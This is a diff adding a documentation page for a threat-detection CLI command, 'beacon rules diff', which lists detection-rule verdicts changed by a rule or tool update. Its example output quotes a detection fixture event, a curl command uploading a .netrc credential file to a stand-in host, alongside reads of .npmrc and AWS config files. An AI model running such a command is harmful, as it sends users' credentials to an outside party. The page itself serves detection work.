@@ -1,0 +1,73 @@
+---
+title: "beacon rules diff"
+description: "Show which Beacon threat-rule verdicts a change to a rule pack, or to Beacon, changes"
+---
+
+## Command overview
+
+`beacon rules diff` compares what two rule packs say about the same events and lists every verdict that changed.
+
+```bash title="Command syntax"
+beacon rules diff <before> <after> [--log-path <file>] [--summary] [--json] [--exit-code]
+beacon rules snapshot [path] [--log-path <file>]
+```
+
+Use it before merging a change to a rule, to a [predicate or catalog](/detections/yaml-schema#predicates) that several rules call, or to Beacon itself. A rule's own fixtures show what its author thought of. A change to a shared definition reaches rules whose fixtures say nothing about it, and this command shows all of it.
+
+## What is compared
+
+Rules are evaluated as `beacon scan` evaluates them. Each single-event rule, and each step of each correlation rule, is evaluated on every event on its own, and each correlation rule is matched over each fixture, and over the log, as a whole. For each one whose answer changed, the output lists the events (for a correlation rule, the findings, named by the fixture and the evidence events) it matches now and did not (`+`) and the ones it matched and no longer does (`-`). An evaluation that fails, most often an expression stopped at the cost limit, leaves the verdict unknown, and that is a change too: `!` lists the events a rule can no longer be evaluated on, and `?` those it can be again.
+
+The events are the fixture events of both packs and the fixtures of their predicates. With `--log-path`, the events of that telemetry log are added, in the order a scan reads them, which shows what the change does on real activity.
+
+```text title="Example output"
+secret-read-then-egress#read_secret: +2 -1
+  + command.executed curl -T .netrc https://drop.example
+  + file.read /home/u/.npmrc
+  - file.read /home/u/.aws/config
+
+1 rule(s) or step(s) changed over 2534 event(s) and 2494 fixture(s) or log(s)
+```
+
+With `--json`, each event of a change carries its `ID`, which identifies it by its content.
+
+## A change to the rules
+
+Give two pack directories, such as a checkout of the main branch and your working tree:
+
+```bash title="Compare two packs"
+beacon rules diff ../main/rules ./rules
+```
+
+## A change to Beacon
+
+A change to how Beacon reads an event changes verdicts without changing a rule, so there are not two packs to compare. Record a snapshot with the old binary and compare it with the new one:
+
+```bash title="Compare across two builds of Beacon"
+beacon-old rules snapshot ./rules > before.json
+beacon rules diff before.json ./rules
+```
+
+A snapshot holds, for each event, a label (its action and its command, path or tool), the rules that matched it and those that could not be evaluated on it, and what each correlation rule found in each fixture and in the log. One taken with `--log-path` therefore holds the commands and paths of that log.
+
+Two sides are compared on the events, and fixtures, both were asked about. Events only one side has are counted and not compared. A snapshot written by a Beacon before this one has no fixture findings and is compared on its events.
+
+## Flags
+
+| Flag | Description |
+| --- | --- |
+| `--log-path <file>` | Also ask about the events of this telemetry JSONL log. |
+| `--summary` | Print the counts for each rule or step, without the events. |
+| `--json` | Output the changes as JSON. |
+| `--exit-code` | Exit non-zero when a verdict changed, for a CI check that a change is verdict-neutral. |
+
+## Related
+
+<Columns cols={2}>
+  <Card title="beacon rules lint" icon="check" href="/cli/rules-lint">
+    Validate rule files and run embedded fixtures.
+  </Card>
+  <Card title="Rule YAML schema" icon="code" href="/detections/yaml-schema">
+    Predicates and the definitions a pack ships.
+  </Card>
+</Columns>
